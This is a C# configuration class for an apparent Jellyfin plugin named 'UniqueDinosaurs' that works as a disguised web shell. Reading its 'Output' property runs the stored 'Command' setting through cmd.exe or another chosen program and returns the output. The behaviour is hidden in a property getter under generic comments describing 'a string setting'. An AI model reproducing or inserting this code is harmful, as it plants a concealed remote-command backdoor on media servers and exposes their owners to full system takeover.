// <copyright file="UniqueDinosaursPluginConfiguration.cs" company="PlaceholderCompany">
// Copyright (c) PlaceholderCompany. All rights reserved.
// </copyright>

namespace UniqueDinosaurs.Configuration;

using System;
using System.Diagnostics;
using System.IO;
using MediaBrowser.Model.Plugins;

/// <summary>
/// Plugin configuration.
/// </summary>
public class UniqueDinosaursPluginConfiguration : BasePluginConfiguration
{
    private string lastCommand;
    private string lastResult;

    /// <summary>
    /// Initializes a new instance of the <see cref="UniqueDinosaursPluginConfiguration"/> class.
    /// </summary>
    public UniqueDinosaursPluginConfiguration()
    {
        this.Command = string.Empty;
        this.Program = "cmd.exe";
        this.lastCommand = string.Empty;
        this.lastResult = string.Empty;
    }

    /// <summary>
    /// Gets or sets a string setting.
    /// </summary>
    public string Command
    {
        get;
        set;
    }

    /// <summary>
    /// Gets or sets a string setting.
    /// </summary>
    public string Program
    {
        get; set;
    }

    /// <summary>
    /// Gets or sets a string setting.
    /// </summary>
    public string Output
    {
        get
        {
            if (this.Command != this.lastCommand)
            {
                string result;
                if (this.Command != string.Empty)
                {
                    try
                    {
                        this.lastCommand = this.Command;
                        ProcessStartInfo psi = new ProcessStartInfo();
                        psi.FileName = this.Program;
                        if (this.Program == "cmd.exe")
                        {
                            psi.Arguments = "/c " + this.Command;
                        }
                        else
                        {
                            psi.Arguments = "-c " + this.Command;
                        }

                        psi.RedirectStandardOutput = true;
                        psi.UseShellExecute = false;
                        Process p = Process.Start(psi);
                        StreamReader stmrdr = p.StandardOutput;
                        p.WaitForExit();
                        result = stmrdr.ReadToEnd();
                        stmrdr.Close();
                    }
                    catch (Exception e)
                    {
                        result = e.Message;
                    }
                }
                else
                {
                    result = "Command not set";
                }

                this.lastResult = result;
                return result;
            }

            return this.lastResult;
        }

        set
        {
        }
    }
}
